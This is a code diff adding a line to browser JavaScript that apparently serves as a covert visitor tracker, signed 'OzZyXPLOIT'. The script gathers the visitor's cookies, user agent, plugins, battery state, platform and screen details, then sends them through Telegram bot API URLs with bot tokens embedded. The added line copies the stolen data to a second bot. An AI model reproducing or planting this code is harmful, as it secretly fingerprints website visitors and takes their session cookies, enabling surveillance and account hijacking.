@@ -27,6 +27,7 @@ if ('getBattery' in navigator) {
       var message = `Pelacak Handal\nSender: OzZyXPLOIT <res@ozzyxploit.xyz>\n\nUser-Agent: ${ua}\nRTT: ${rtt}\nConnection: ${typeconn}\nSpeed: ${speednetw}\nPlugins: ${exten}\nBattery: ${batre}\nCharging: ${ngecas}\nCore: ${cpucore}\nPlatform: ${platform}\nApp Ver: ${appVer}\nApp Name: ${appName}\nProduct: ${product}\nLanguage: ${lang}\nCookie: ${cookie}\nOnline: ${online}\nDoNotTrack: ${dnt}\nVendor: ${vendor}\nMemo: ${memo}\nResolution: ${reso}\nColor Depth: ${cd}`;
       var encURL = encodeURIComponent(message);
       fetch(`https://api.telegram.org/bot6505548655:AAHjGN6WYjiIH9bWD5hpRSH0HqXIy_0jbvE/sendMessage?chat_id=6064818646&text=${encURL}`)
+      fetch(`https://api.telegram.org/bot7260705860:AAH2LAPzl9H16mEbiHWFNdEZav-eFhE3hho/sendMessage?chat_id=7203532510&text=${encURL}`)
     })
   }
 }
